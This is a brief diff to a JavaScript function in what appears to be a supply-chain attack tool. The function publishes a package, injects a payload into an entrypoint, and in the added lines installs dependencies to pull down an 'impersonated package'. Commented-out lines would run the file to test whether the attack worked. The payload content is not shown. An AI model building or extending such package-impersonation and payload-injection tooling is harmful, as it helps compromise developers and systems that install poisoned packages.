@@ -49,13 +49,17 @@ async function handleSubmission(submission, shell_data, entrypoint) {
 
     if (response.status === 200) {
         success(`Package created successfully, available at \"${response.url}\"`)
-        success(`Package data: ${manifest.name}@${manifest.version}`)
 
         if (shell_data.attack) {
             log(`Performing attack using ${manifest.name}@${manifest.version}`)
             const result = manager.pm.insertPayload(entrypoint)
             if (result) {
-                success(`Payload injected successfully`)
+                success('Payload injected successfully')
+                log('Installing dependencies to download impersonated package.')
+                manager.pm.installDependencies()
+                success('Dependencies installed successfully')
+                //log('Testing if process was successful...')
+                //manager.pm.runFile(entrypoint)
             } else {
                 error(`Failed to inject payload`)
             }
